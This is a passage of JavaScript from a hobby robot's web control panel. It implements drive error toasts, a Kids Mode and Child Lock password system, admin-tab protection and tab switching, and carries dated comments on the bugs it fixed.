      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: ctrl.signal,
    });
    if (!res.ok) {
      console.warn(`API POST ${endpoint}: HTTP ${res.status}`);
      // Bug H5 fix 2026-05-15: surface 503 reason to operator instead
      // of silent console.warn. VESC fault / undervoltage / E-STOP
      // mid-drive used to silently fail with no UI — operator wondered
      // why joystick stopped responding. Edge-trigger so we don't
      // spam toasts during a sustained 503 (keep-alive fires 5x/s).
      if (res.status === 503 || res.status === 403) {
        try {
          const body = await res.json();
          const reason = (body && body.error) || `HTTP ${res.status}`;
          const now = performance.now();
          if (!_postMotion._lastToastAt || now - _postMotion._lastToastAt > 3000) {
            _postMotion._lastToastAt = now;
            if (typeof toast === 'function') toast(`Drive blocked: ${reason}`, 'error');
          }
        } catch {}
      }
      return null;
    }
    return await res.json();
  } catch (e) {
    if (e.name !== 'AbortError') console.error(`API POST ${endpoint}:`, e);
    return null;
  } finally {
    clearTimeout(timer);
    if (_motionAborts[slot] === ctrl) _motionAborts[slot] = null;
  }
}

// ================================================================
// Toast Manager
// ================================================================

class ToastManager {
  constructor() {
    this._el = el('toast');
    this._timer = null;
  }

  // action = { label: 'UNDO', onClick: () => {} } — adds a clickable button
  // to the toast and extends the auto-dismiss to 5s. Click dismisses the
  // toast and runs onClick(). Null/undefined action = plain toast.
  show(msg, type = 'info', action = null) {
    const t = this._el;
    t.replaceChildren();   // wipe previous content
    if (action && action.label) {
      // Audit finding L-1 2026-05-15: was innerHTML with `${safeLbl}`
      // interpolated. The local escapeHtml-like sub didn't escape `'`
      // (a known sink — see CLAUDE.md). Today every caller passes
      // the constant string 'UNDO', so no live XSS, but a future
      // caller could pass user input as action.label. Build the
      // button via createElement so the surface is permanently
      // closed.
      const span = document.createElement('span');
      span.className = 'toast-msg';
      span.textContent = msg;
      t.appendChild(span);

      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'toast-action';
      Object.assign(btn.style, {
        marginLeft: '10px', padding: '2px 9px',
        background: 'rgba(0,200,255,.18)',
        border: '1px solid var(--blue)',
        borderRadius: '3px',
        color: 'var(--blue)',
        cursor: 'pointer',
        fontFamily: 'var(--font-data)',
        fontSize: '10px',
        letterSpacing: '1.2px',
        textTransform: 'uppercase',
      });
      btn.textContent = String(action.label);
      btn.addEventListener('click', () => {
        try { action.onClick(); } finally {
          clearTimeout(this._timer);
          t.classList.remove('show');
        }
      });
      t.appendChild(btn);
    } else {
      t.textContent = msg;
    }
    t.className = `toast toast-${type} show`;
    clearTimeout(this._timer);
    this._timer = setTimeout(() => t.classList.remove('show'), action ? 5000 : 3000);
  }
}

const toastMgr = new ToastManager();
function toast(msg, type = 'info', action = null) { toastMgr.show(msg, type, action); }

// ================================================================
// Tab Navigation
// ================================================================

// ================================================================
// Lock Manager — Kids Mode / Child Lock
// ================================================================

class LockManager {
  constructor() {
    this._mode         = 0;   // 0=Normal 1=Kids 2=ChildLock
    // W21 fix 2026-05-16: use per-robot localStorage helper (CLAUDE.md
    // pattern). _lsGet falls back to legacy key for migration.
    this._kidsSpeed    = parseInt(_lsGet('kidsSpeedLimit') || '20');
    this._prevSpeed    = null;
    // B4/E4 fix 2026-05-16: use wall-clock timestamp instead of
    // setTimeout. Hidden-tab browser throttling paused the timer →
    // _kidsTimedOut stayed false past 5min wall time → escalation
    // skipped the password modal. Now: store entry timestamp,
    // compute (now - ts) on demand inside onBtnClick.
    this._kidsEnterTs  = 0;
    this._KIDS_TIMEOUT = 5 * 60 * 1000;   // 5 minutes
  }

  // B4/E4 helper — replaces the setTimeout-based _kidsTimedOut flag
  get _kidsTimedOut() {
    return this._kidsEnterTs > 0 && (Date.now() - this._kidsEnterTs) >= this._KIDS_TIMEOUT;
  }

  get mode() { return this._mode; }

  init() {
    const s = el('kids-speed-slider');
    if (s) { s.value = this._kidsSpeed; syncHoloSlider(s); }
    const v = el('kids-speed-val');
    if (v) v.textContent = this._kidsSpeed + '%';
    // W5 fix 2026-05-16: live preview hint for kids speed slider
    this._updateKidsPreview();
    document.body.dataset.lockMode = '0';
    this._updateDriveLockLabel();
    // W24 fix 2026-05-16: pre-set active class on mode 0 button so
    // Settings panel doesn't briefly show no-active state
    const btn0 = document.querySelector('.lock-mode-btn[data-mode="0"]');
    if (btn0) btn0.classList.add('active');
    // B10/B14 fix 2026-05-16: synchronously fetch /status once at init
    // so the UI reflects the SERVER lock_mode + kids_speed_limit
    // immediately instead of showing Normal for ~2s until the first
    // StatusPoller tick. Operator opening the page in ChildLock no
    // longer sees a misleading 'unlocked' state.
    api('/status').then(d => {
      if (!d) return;
      if (typeof d.kids_speed_limit === 'number') {
        const serverPct = Math.round(d.kids_speed_limit * 100);
        this._kidsSpeed = serverPct;
        _lsSet('kidsSpeedLimit', String(serverPct));
        if (s) { s.value = serverPct; syncHoloSlider(s); }
        if (v) v.textContent = serverPct + '%';
      }
      // Batch 3 fix 2026-05-16: sync child_dome_speed_limit from /status
      if (typeof d.child_dome_speed_limit === 'number') {
        const childPct = Math.round(d.child_dome_speed_limit * 100);
        this._childDomeSpeed = childPct;
        const cs = el('child-dome-slider');
        const cv = el('child-dome-val');
        if (cs) { cs.value = childPct; syncHoloSlider(cs); }
        if (cv) cv.textContent = childPct + '%';
      }
      if (typeof d.lock_mode === 'number' && d.lock_mode !== 0) {
        this.syncFromStatus(d.lock_mode);
      }
    }).catch(() => {});
  }

  setKidsSpeed(val) {
    this._kidsSpeed = val;
    const v = el('kids-speed-val');
    if (v) v.textContent = val + '%';
    this._updateKidsPreview();
    if (this._mode === 1) this._applyKidsSpeed();
    if (this._kidsSendTimer) clearTimeout(this._kidsSendTimer);
    this._kidsSendTimer = setTimeout(() => {
      _lsSet('kidsSpeedLimit', String(val));
      api('/lock/set', 'POST', {
        mode: this._mode,
        kids_speed_limit: val / 100,
      });
      this._kidsSendTimer = null;
    }, 250);
  }

  // Batch 3 fix 2026-05-16: child_dome_speed_limit slider handler
  // (separate from Kids — Child is stricter, slower dome).
  setChildDomeSpeed(val) {
    this._childDomeSpeed = val;
    const v = el('child-dome-val');
    if (v) v.textContent = val + '%';
    // Live preview text
    const p = el('child-dome-preview');
    if (p) {
      p.textContent = val <= 15 ? 'Very slow — tiny rotation per joystick push'
                    : val <= 30 ? 'Slow — gentle rotation for small kids'
                    : 'Moderate — bigger rotation, still capped';
    }
    // Same 250ms debounce as setKidsSpeed
    if (this._childSendTimer) clearTimeout(this._childSendTimer);
    this._childSendTimer = setTimeout(() => {
      api('/lock/set', 'POST', {
        mode: this._mode,
        child_dome_speed_limit: val / 100,
      });
      this._childSendTimer = null;
    }, 250);
  }

  onBtnClick() {
    if (this._mode === 0) {
      this._applyMode(1);                        // Normal → Kids (direct)
    } else if (this._mode === 1) {
      if (this._kidsTimedOut) {
        this._showKidsChoiceModal();             // ≥5 min en Kids → choix
      } else {
        this._applyMode(2);                      // <5 min en Kids → Child Lock direct
      }
    } else {
      this._showUnlockModal();                   // Child Lock → déverrouillage
    }
  }

  // W22 fix 2026-05-16: shared modal-open helper. Centralizes
  // cleanup (shake class, disabled inputs, stale lockout timer) so
  // every reopen path starts fresh. Was: each show* path duplicated
  // partial cleanup and could leave stale .shake or disabled inputs.
  _openModal({ severity, title, sub, showChildLockBtn }) {
    const m = el('lock-modal');
    m.classList.remove('hidden');
    // W15 fix 2026-05-16: data-severity attribute → CSS targets
    m.dataset.severity = severity;
    el('lock-modal-icon').style.color   = severity === 'warn' ? 'var(--orange)' : 'var(--red)';
    el('lock-modal-title').style.color  = severity === 'warn' ? 'var(--orange)' : 'var(--red)';
    el('lock-modal-title').textContent  = title;
    el('lock-modal-sub').textContent    = sub;
    el('lock-childlock-btn').style.display = showChildLockBtn ? '' : 'none';
    // W22: full reset on every open
    const inp = el('lock-pwd-input');
    if (inp) { inp.value = ''; inp.classList.remove('shake'); inp.disabled = false; }
    const err = el('lock-pwd-error');
    if (err) { err.classList.add('hidden'); err.textContent = 'Incorrect password'; }
    el('lock-pwd-caps')?.classList.add('hidden');
    const submitBtn = document.querySelector('#lock-modal .btn.btn-active');
    if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'UNLOCK'; }
    if (this._lockoutTimer) { clearInterval(this._lockoutTimer); this._lockoutTimer = null; }
    setTimeout(() => inp?.focus(), 80);
  }

  _showKidsChoiceModal() {
    this._openModal({
      severity: 'warn',
      title: 'KIDS MODE ACTIVE',
      sub: 'Enter password to return to normal mode',
      showChildLockBtn: true,
    });
  }

  _showUnlockModal() {
    this._openModal({
      severity: 'danger',
      title: 'UNLOCK',
      sub: 'Enter admin password to return to normal mode',
      showChildLockBtn: false,
    });
  }

  cancelModal() { el('lock-modal').classList.add('hidden'); }

  onOverlayClick(e) { if (e.target === el('lock-modal')) this.cancelModal(); }

  // Depuis le modal : escalader en Child Lock
  escalateToChildLock() {
    el('lock-modal').classList.add('hidden');
    this._applyMode(2);
  }

  _updateCapsHint(e) {
    const hint = el('lock-pwd-caps');
    if (!hint) return;
    // B11 fix 2026-05-16: only check on real character keys.
    // Was: fired on every key including F-keys/Tab where getModifierState
    // returns inconsistent results across browsers → false hint toggles.
    if (!e || !e.key || e.key.length !== 1) return;
    const on = typeof e.getModifierState === 'function'
      ? e.getModifierState('CapsLock') : false;
    hint.classList.toggle('hidden', !on);
  }
  onKeyDown(e) {
    if (e.key === 'Enter')  { this.submitModal(); return; }
    if (e.key === 'Escape') { this.cancelModal(); return; }
    // B12 fix 2026-05-16: focus trap. Tab cycle stays within modal
    // (input → Cancel → Unlock → input). Was: Tab escaped to underlying
    // drive UI — operator could accidentally tap drive joystick while
    // modal "modal".
    if (e.key === 'Tab') {
      const modal = el('lock-modal');
      if (!modal) return;
      const focusable = Array.from(modal.querySelectorAll('input, button')).filter(x => !x.disabled);
      if (!focusable.length) return;
      const first = focusable[0], last = focusable[focusable.length - 1];
      if (e.shiftKey && document.activeElement === first) {
        e.preventDefault(); last.focus();
      } else if (!e.shiftKey && document.activeElement === last) {
        e.preventDefault(); first.focus();
      }
      return;
    }
    this._updateCapsHint(e);
  }
  onKeyUp(e) { this._updateCapsHint(e); }

  async submitModal() {
    // E7 fix 2026-05-16: in-flight guard — double-tap on UNLOCK fired
    // two POSTs; second one wasted a rate-limit slot.
    if (this._unlockInFlight) return;
    const pwd = (el('lock-pwd-input').value || '').trim();
    // B13 fix 2026-05-16: client-side empty password guard so we don't
    // burn a server rate-limit attempt on an obvious oops.
    if (!pwd) {
      const inp = el('lock-pwd-input');
      inp.classList.remove('shake'); void inp.offsetWidth; inp.classList.add('shake');
      inp.focus();
      return;
    }
    this._unlockInFlight = true;
    // W2 fix 2026-05-16: disable button + spinner cue
    const submitBtn = document.querySelector('#lock-modal .btn.btn-active');
    if (submitBtn) { submitBtn.disabled = true; submitBtn.dataset._origText = submitBtn.textContent; submitBtn.textContent = '…'; }
    try {
      // apiDetail returns full response shape so we can distinguish 429
      // (rate-limit lockout from batch 1 server fix) from 401 (wrong pw).
      const res = await apiDetail('/lock/unlock', 'POST', { password: pwd, mode: 0 });
      if (res.ok) {
        el('lock-modal').classList.add('hidden');
        this._applyMode(0);
        return;
      }
      // W3 fix 2026-05-16: 429 lockout — show retry countdown
      if (res.status === 429) {
        this._showLockoutCountdown(res.data?.retry_after_s || 300);
        return;
      }
      // Other failures: shake + error msg
      el('lock-pwd-error').classList.remove('hidden');
      el('lock-pwd-error').textContent = res.error || 'Incorrect password';
    } catch {
      // network error — generic visual error
      el('lock-pwd-error').classList.remove('hidden');
      el('lock-pwd-error').textContent = 'Network error';
    } finally {
      this._unlockInFlight = false;
      if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = submitBtn.dataset._origText || 'UNLOCK'; }
    }
    const inp = el('lock-pwd-input');
    inp.value = '';
    inp.classList.remove('shake');
    void inp.offsetWidth;
    inp.classList.add('shake');
    inp.focus();
  }

  // W3 fix 2026-05-16: live countdown when server returns 429 lockout
  _showLockoutCountdown(seconds) {
    const errEl = el('lock-pwd-error');
    const inp   = el('lock-pwd-input');
    const submitBtn = document.querySelector('#lock-modal .btn.btn-active');
    if (!errEl) return;
    if (inp)       inp.disabled = true;
    if (submitBtn) submitBtn.disabled = true;
    errEl.classList.remove('hidden');
    let remaining = seconds;
    const tick = () => {
      const m = Math.floor(remaining / 60);
      const s = remaining % 60;
      errEl.textContent = `Too many attempts — retry in ${m}:${String(s).padStart(2,'0')}`;
      if (remaining <= 0) {
        clearInterval(this._lockoutTimer);
        this._lockoutTimer = null;
        if (inp)       inp.disabled = false;
        if (submitBtn) submitBtn.disabled = false;
        errEl.textContent = 'Try again';
        return;
      }
      remaining--;
    };
    if (this._lockoutTimer) clearInterval(this._lockoutTimer);
    tick();
    this._lockoutTimer = setInterval(tick, 1000);
  }

  _applyMode(mode) {
    // W9/B3 fix 2026-05-16: relaxation (going TOWARD less restrictive)
    // requires the password modal.
    const prev = this._mode;
    if (mode < prev) {
      this._showUnlockModal();
      return;
    }
    // B8 fix 2026-05-16: no-op if already in this mode
    if (mode === prev) return;
    this._mode = mode;
    document.body.dataset.lockMode = mode;

    const label = el('lock-mode-label');
    if (label) label.textContent = ['', 'KIDS', 'LOCK'][mode];
    this._updateDriveLockLabel();

    // B4/E4 fix 2026-05-16: use _kidsEnterTs (wall-clock) instead of
    // setTimeout. Hidden tabs throttle timers; wall-clock diff is robust.
    if (mode === 1) {
      this._prevSpeed   = Math.round(_speedLimit * 100);
      this._kidsEnterTs = Date.now();
      this._applyKidsSpeed();
    } else {
      this._kidsEnterTs = 0;
      if (mode === 0 && prev !== 0 && this._prevSpeed !== null) {
        const s = el('speed-slider');
        if (s) { s.value = this._prevSpeed; setSpeed(this._prevSpeed); }
        this._prevSpeed = null;
      }
    }

    api('/lock/set', 'POST', { mode });

    // Three-tier lock model — design intent confirmed 2026-05-14:
    //   Mode 0 = Normal — full drive at user speed slider
    //   Mode 1 = Kids Mode — drive enabled but capped at kids_speed_limit
    //                        (kid drives the robot, slow & safe)
    //   Mode 2 = Child Lock — DRIVE blocked, dome/sounds/lights still free
    //                        (hand the tablet to a kid: they can play with
    //                        sounds/dome/lights without risking propulsion)
    // The toast wording must reflect what's still ALLOWED in each mode so
    // the operator doesn't think Child Lock is a kill switch.
    const msgs  = [
      'Normal mode restored',
      'Kids Mode — drive at limited speed, dome + sounds OK',
      'Child Lock — drive blocked, dome + sounds + lights still OK',
    ];
    const types = ['ok', 'warn', 'error'];
    toast(msgs[mode], types[mode]);
  }

  _applyKidsSpeed() {
    const s = el('speed-slider');
    if (s) { s.value = this._kidsSpeed; setSpeed(this._kidsSpeed); }
  }

  // W5 fix 2026-05-16: contextual hint under the kids speed slider
  // so operator has a mental model of what % means physically.
  _updateKidsPreview() {
    const hint = el('kids-speed-preview');
    if (!hint) return;
    const v = this._kidsSpeed;
    let txt = '', cls = '';
    if (v <= 15)      { txt = '≈ slow walk (very safe)';     cls = 'preview-ok'; }
    else if (v <= 30) { txt = '≈ brisk walk (kid-friendly)'; cls = 'preview-ok'; }
    else if (v <= 45) { txt = '≈ jog (supervise)';           cls = 'preview-warn'; }
    else              { txt = '⚠ ≈ jog/run (close supervision)'; cls = 'preview-err'; }
    hint.textContent = txt;
    hint.className = 'kids-speed-preview ' + cls;
  }

  // W1 fix 2026-05-16: two-line drive button label so operator sees
  // status (top) + action hint (bottom). Was: ambiguous LOCK/KIDS/
  // CHILD with no clue what tap does next.
  _updateDriveLockLabel() {
    const dlabel = el('drive-lock-label');
    if (!dlabel) return;
    const STATUS = ['NORMAL',   'KIDS',     'CHILD LOCK'][this._mode];
    const ACTION = ['→ KIDS',   '→ CHILD',  '→ UNLOCK'  ][this._mode];
    dlabel.innerHTML = `<span class="drive-lock-status">${STATUS}</span><span class="drive-lock-hint">${ACTION}</span>`;
    // W16 fix 2026-05-16: timed-out dot on drive button after 5min Kids
    const btn = el('drive-lock-btn');
    if (btn) btn.classList.toggle('kids-timed-out', this._mode === 1 && this._kidsTimedOut);
  }

  isDriveLocked() { return this._mode === 2; }
  isKidsMode()    { return this._mode === 1; }

  syncFromStatus(lockMode) {
    if (lockMode !== undefined && lockMode !== this._mode) {
      const prev = this._mode;
      this._mode = lockMode;
      document.body.dataset.lockMode = lockMode;
      const label = el('lock-mode-label');
      if (label) label.textContent = ['', 'KIDS', 'LOCK'][lockMode];
      this._updateDriveLockLabel();
      // E18 fix 2026-05-16: when /status fails (Master unreachable), the
  // lock state shown is stale. Disable lock mode buttons so operator
  // can't queue actions while offline.
  // (Hook called from StatusPoller offline path via lockMgr.setOnline)

  // W12 fix 2026-05-16: pulse the drive button on external change
      // (another tab, BT, admin) so operator notices the state shift.
      const btn = el('drive-lock-btn');
      if (btn) {
        btn.classList.add('lock-external-pulse');
        setTimeout(() => btn.classList.remove('lock-external-pulse'), 1200);
      }
      const TOASTS = ['Lock mode changed externally — NORMAL',
                      'Lock mode changed externally — KIDS',
                      'Lock mode changed externally — CHILD LOCK'];
      const TYPES  = ['ok', 'warn', 'error'];
      if (typeof toast === 'function') toast(TOASTS[lockMode], TYPES[lockMode]);
      // WOW polish X3 2026-05-15: sync the lock-mode-switcher buttons
      // in Settings → Lock panel so they reflect the actual mode.
      document.querySelectorAll('.lock-mode-btn').forEach(b => {
        b.classList.toggle('active', parseInt(b.dataset.mode) === lockMode);
      });
      // F-5 + B4/E4 + E6 fix 2026-05-16: mirror _applyMode's cleanup
      // for the Kids entry timestamp + prev speed. _applyMode is NOT
      // called here on purpose — syncFromStatus reflects the server's
      // already-applied state, so we skip the api('/lock/set') POST.
      this._kidsEnterTs = 0;
      if (lockMode === 1) {
        // E6 fix: only snapshot _prevSpeed if coming from Normal.
        // Otherwise (transient 1→0→1 across two polls) we'd snapshot
        // the kids cap as if it were the operator's preference.
        if (prev === 0) this._prevSpeed = Math.round(_speedLimit * 100);
        this._kidsEnterTs = Date.now();
        this._applyKidsSpeed();
      } else if (lockMode === 0 && prev !== 0 && this._prevSpeed !== null) {
        const s = el('speed-slider');
        if (s) { s.value = this._prevSpeed; setSpeed(this._prevSpeed); }
        this._prevSpeed = null;
      }
    }
  }
}

const lockMgr = new LockManager();

// ================================================================
// Admin Guard — onglets protégés (SETTINGS / CHOREO)
// ================================================================

class AdminGuard {
  constructor() {
    this._unlocked      = false;
    this._timer         = null;
    this._TIMEOUT       = 5 * 60 * 1000;   // 5 minutes
    this._PROTECTED     = new Set(['settings']);
    this._activeTabId   = '';               // updated by onTabSwitch (always, even when locked)
    this._pendingTab    = null;             // tab to open after successful unlock
    this._pendingCallback = null;           // callback to run after successful unlock (choreo guard)
    // Bound handler — stored to allow removeEventListener
    this._boundActivity = () => this._onActivity();
  }

  get unlocked() { return this._unlocked; }
  isProtected(tabId) { return this._PROTECTED.has(tabId); }

  showModal(pendingTab = null, pendingCallback = null) {
    this._pendingTab      = pendingTab;
    this._pendingCallback = pendingCallback;
    const m = el('admin-modal');
    if (!m) return;
    m.classList.remove('hidden');
    el('admin-pwd-input').value = '';
    el('admin-pwd-error').classList.add('hidden');
    el('admin-pwd-caps')?.classList.add('hidden');   // reset stale hint on reopen
    setTimeout(() => el('admin-pwd-input').focus(), 80);
  }

  cancel() { el('admin-modal').classList.add('hidden'); }

  onOverlayClick(e) {
    if (e.target === el('admin-modal')) this.cancel();
  }

  // CapsLock indicator — user-reported 2026-05-15: 'quand le Caps
  // Lock est activé il devrait avoir une indication'. Browsers can't
  // toggle the OS key state from JS, so we surface a warning instead.
  // getModifierState('CapsLock') reflects the LIVE state at event
  // time on both keydown and keyup (so toggling the key with the
  // field empty still updates the indicator).
  _updateCapsHint(e) {
    const hint = el('admin-pwd-caps');
    if (!hint) return;
    const on = e && typeof e.getModifierState === 'function'
      ? e.getModifierState('CapsLock') : false;
    hint.classList.toggle('hidden', !on);
  }
  onKeyDown(e) {
    if (e.key === 'Enter')  { this.submit(); return; }
    if (e.key === 'Escape') { this.cancel(); return; }
    this._updateCapsHint(e);
  }
  onKeyUp(e) { this._updateCapsHint(e); }

  submit() {
    const pwd = el('admin-pwd-input').value;
    const btn = el('admin-modal').querySelector('.btn-active');
    if (btn) btn.disabled = true;
    api('/settings/admin/verify', 'POST', { password: pwd })
      .then(d => {
        if (d && d.ok) {
          // B-1: remember the password in memory so api() can attach it
          // as X-Admin-Pw on every subsequent admin call. Cleared in
          // lock(). Not persisted anywhere — sessionStorage would
          // survive tab reloads but a malicious browser extension
          // could read it; in-memory minimises the exposure window.
          this._token = pwd;
          this._unlock();
        } else {
          this._showError();
        }
      })
      .catch(() => this._showError())
      .finally(() => { if (btn) btn.disabled = false; });
  }

  // Used by api() to attach X-Admin-Pw on admin endpoints. Returns
  // empty string when locked so api() simply omits the header (the
  // server then 401s any admin endpoint, which is what we want).
  getToken() {
    return this._unlocked ? (this._token || '') : '';
  }

  _showError() {
    el('admin-pwd-error').classList.remove('hidden');
    const inp = el('admin-pwd-input');
    inp.value = '';
    inp.classList.remove('shake');
    void inp.offsetWidth;
    inp.classList.add('shake');
    inp.focus();
  }

  _unlock() {
    this._unlocked = true;
    document.body.classList.add('admin-unlocked');
    el('admin-modal').classList.add('hidden');
    toast('Admin access granted — expires in 5 min', 'ok');
    audioBoard?.showUploadZone(true);
    // Navigate to the tab that triggered the auth prompt
    if (this._pendingTab) {
      const t = this._pendingTab;
      this._pendingTab = null;
      switchTab(t);
    }
    // Run choreo action that triggered the auth prompt
    if (this._pendingCallback) {
      const cb = this._pendingCallback;
      this._pendingCallback = null;
      _choreoUnlocked = true;
      cb();
    }
    scriptEngine._syncAdminMode();
    // Track activity to reset the timer while on a protected tab.
    // pointerdown is used instead of click: mousedown.preventDefault() in the
    // Choreo editor suppresses click events, but never suppresses pointerdown.
    document.addEventListener('mousemove',   this._boundActivity, { passive: true });
    document.addEventListener('pointerdown', this._boundActivity, { passive: true });
    document.addEventListener('keydown',     this._boundActivity, { passive: true });
    this._startTimer();
  }

  lock() {
    if (!this._unlocked) return;
    // If a choreography is playing, postpone lock — check again in 60s
    if (typeof choreoEditor !== 'undefined' && choreoEditor.isPlaying()) {
      this._timer = setTimeout(() => this.lock(), 60 * 1000);
      return;
    }
    this._unlocked = false;
    this._token = '';   // B-1: drop the in-memory password on lock
    clearTimeout(this._timer);
    document.body.classList.remove('admin-unlocked');
    audioBoard?.showUploadZone(false);
    document.removeEventListener('mousemove',   this._boundActivity);
    document.removeEventListener('pointerdown', this._boundActivity);
    document.removeEventListener('keydown',     this._boundActivity);
    // If on a protected tab → return to DRIVE
    if (this._PROTECTED.has(this._activeTabId)) {
      switchTab('drive');
    }
    toast('Admin access expired', 'info');
    scriptEngine._syncAdminMode();
  }

  toggleFromHeader() {
    if (this._unlocked) {
      this.lock();
    } else {
      this.showModal();  // no pendingTab — stay on current tab
    }
  }

  onTabSwitch(tabId) {
    this._activeTabId = tabId;   // always track, even when locked
    if (!this._unlocked) return;
    this._startTimer();
  }

  _onActivity() {
    if (!this._unlocked) return;
    this._startTimer();  // any activity resets the inactivity timer, regardless of tab
  }

  _startTimer() {
    clearTimeout(this._timer);
    this._timer = setTimeout(() => this.lock(), this._TIMEOUT);
  }
}

const adminGuard = new AdminGuard();

// Choreo tab session unlock — true after first admin auth while in choreo tab.
// Resets when leaving the choreo tab so the next visit requires re-auth.
let _choreoUnlocked = false;

// VESC tab fast-poll — active only while VESC tab is open
let _vescTabTimer = null;
function _startVescTabPoll() {
  if (_vescTabTimer) return;
  vescPanel.refresh();
  _vescTabTimer = setInterval(() => vescPanel.refresh(), 500);
}
function _stopVescTabPoll() {
  if (_vescTabTimer) { clearInterval(_vescTabTimer); _vescTabTimer = null; }
}

function switchTab(tabId) {
  // Onglet protégé sans accès → ouvrir modal, puis y revenir après unlock
  if (adminGuard.isProtected(tabId) && !adminGuard.unlocked) {
    adminGuard.showModal(tabId);
    return;
  }

  // Dirty-flag guard for tab switch. Audit finding Frontend H-3
  // 2026-05-15: switching tabs away from the Choreo editor with
  // unsaved changes silently discarded them. Confirm before leaving.
  const currentTab = document.querySelector('.tab.active')?.dataset.tab;
  if (currentTab === 'choreo' && tabId !== 'choreo'
      && typeof choreoEditor !== 'undefined' && choreoEditor.hasUnsavedChanges
      && choreoEditor.hasUnsavedChanges()) {
    if (!confirm('Choreo editor has unsaved changes. Leave anyway and lose them?')) {
      return;
    }
  }

  document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  el('admin-gear-btn')?.classList.remove('active');
  const tabBtn = document.querySelector(`.tab[data-tab="${tabId}"]`);
  const tabContent = el(`tab-${tabId}`);
  if (tabBtn) tabBtn.classList.add('active');
  if (tabContent) tabContent.classList.add('active');
  // Gear button highlights when settings tab is active
  if (tabId === 'settings') el('admin-gear-btn')?.classList.add('active');

  adminGuard.onTabSwitch(tabId);

  if (tabId === 'settings') {
    loadSettings();
    loadServoSettings();
    armsConfig.load();
    behaviorPanel.load();
    // Activate first sidebar item if none selected yet
    if (!document.querySelector('.settings-nav-item.active')) {
      switchSettingsPanel('behavior');
    }
  }
  if (tabId === 'sequences') loadScripts();
  if (tabId === 'lights') loadLightSequences();
  if (tabId === 'audio') loadAudioCategories();

  // B2/P1 fix 2026-05-16: pause/resume the _domeSim rAF loop on tab
  // enter/leave. Without this it kept running 60Hz on all tabs (the
  // dome sim DOM is display:none but rAF doesn't auto-pause for that).
  if (typeof _domeSim !== 'undefined') {
    if (tabId === 'lights') {
      if (_domeSim.resume) _domeSim.resume();
    } else {
      if (_domeSim.pause)  _domeSim.pause();
    }
  }

  // Stop VESC fast poll when leaving settings/vesc panel
  if (tabId !== 'settings') {
    _stopVescTabPoll();
    // User-reported 2026-05-15: VESC Drive Test Mode should be a
    // context-scoped feature — leaving the Settings/VESC panel
    // (here: leaving Settings entirely) immediately disables it so a
    // forgotten test mode can't bite the next visitor of the page.
    // Sends /motion/stop and resets the UI as part of toggle().
    if (typeof vescTest !== 'undefined' && vescTest._active) vescTest.toggle();
  }

  // Reset choreo session unlock when leaving the choreo tab. Also pause
  // the _chorMon rAF loop — its dot animations don't auto-pause on
  // display:none (only on browser-tab hidden), so without this they'd
  // keep burning Pi CPU while the user is on Drive/Audio/etc.
  if (tabId !== 'choreo') {
    _choreoUnlocked = false;
    choreoEditor._stopPolling();
    if (typeof _chorMon !== 'undefined' && _chorMon.pause) _chorMon.pause();
  }

  // Audit reclass R2 2026-05-15: pause/resume the camera stream on
  // Drive tab enter/leave. Saves bandwidth + tablet battery during
  // the time the operator is in another tab.
  if (tabId === 'drive') {
    if (typeof _resumeCameraStream === 'function') _resumeCameraStream();
  } else {
    if (typeof _pauseCameraStream === 'function') _pauseCameraStream();
  }

  if (tabId === 'choreo') choreoEditor.init();
}

function switchSettingsPanel(panelId) {
  document.querySelectorAll('.settings-nav-item').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.settings-panel').forEach(p => p.classList.remove('active'));
  const btn   = document.querySelector(`.settings-nav-item[data-panel="${panelId}"]`);
  const panel = el(`spanel-${panelId}`);
  if (btn)   btn.classList.add('active');
  if (panel) panel.classList.add('active');

  // VESC fast poll only while VESC panel is visible
  if (panelId === 'vesc') _startVescTabPoll();
  else {
    _stopVescTabPoll();
    // Same scoping logic as the outer-tab switch above: leaving the
    // VESC sub-panel (even while staying in Settings) disables Drive
    // Test Mode. User-reported 2026-05-15.
    if (typeof vescTest !== 'undefined' && vescTest._active) vescTest.toggle();
  }

  // Lazy-load panel data when opening
  if (panelId === 'network' || panelId === 'deploy' || panelId === 'system' || panelId === 'hats') loadSettings();
  if (panelId === 'servos')      loadServoSettings();
  if (panelId === 'arms')        armsConfig.load();
  if (panelId === 'behavior')    behaviorPanel.load();
  if (panelId === 'audio')       {
    soundProfiles.load(); btSpeaker.refresh();
    try {
      const ch = document.getElementById('audio-channels');
      if (ch) updateChannelsHint(ch.value);
    } catch {}
  }
  if (panelId === 'diagnostics') diagPanel.load();
  if (panelId === 'shortcuts')   shortcutsEditor.load();
  if (panelId === 'bluetooth')   { try { btCustomMappings.load(); } catch {} }
  if (panelId === 'battery')     { try { updateBatteryPreview(); } catch {} }
  if (panelId === 'camera')      { try { updateCameraBitrateHint(); } catch {} }
  if (panelId === 'deploy')      { try { loadDeployCommitInfo(); } catch {} }
  if (panelId === 'lock')        {
    // WOW polish X3: sync mode buttons with current state on panel open.
    document.querySelectorAll('.lock-mode-btn').forEach(b => {
      b.classList.toggle('active', parseInt(b.dataset.mode) === (lockMgr._mode ?? 0));
    });
  }
}

// WOW polish I7 2026-05-15: admin password strength meter + Caps Lock
// warning. Operator setting a weak password gets immediate visual
// feedback before submitting. Caps Lock detection prevents the classic
// "I typed the right password but Caps was on" admin-lockout.
function updatePwdStrength() {
  const inp   = el('admin-pwd-new');
  const bar   = el('admin-pwd-strength-bar');
  const label = el('admin-pwd-strength-label');
  if (!inp || !bar || !label) return;
  const v = inp.value || '';
  let score = 0;
  if (v.length >= 4)  score++;
  if (v.length >= 8)  score++;
  if (v.length >= 12) score++;
  if (/[a-z]/.test(v) && /[A-Z]/.test(v)) score++;
  if (/[0-9]/.test(v)) score++;
  if (/[^a-zA-Z0-9]/.test(v)) score++;
  const tiers = [
    { pct: 0,   label: 'too short',  color: 'var(--text-dim)' },
    { pct: 15,  label: 'very weak',  color: 'var(--red, #ff2244)' },
    { pct: 30,  label: 'weak',       color: 'var(--red, #ff2244)' },
    { pct: 50,  label: 'fair',       color: 'var(--amber, #ffaa44)' },
    { pct: 70,  label: 'good',       color: 'var(--amber, #ffaa44)' },
    { pct: 85,  label: 'strong',     color: 'var(--green, #00cc66)' },
    { pct: 100, label: 'very strong', color: 'var(--green, #00cc66)' },
  ];
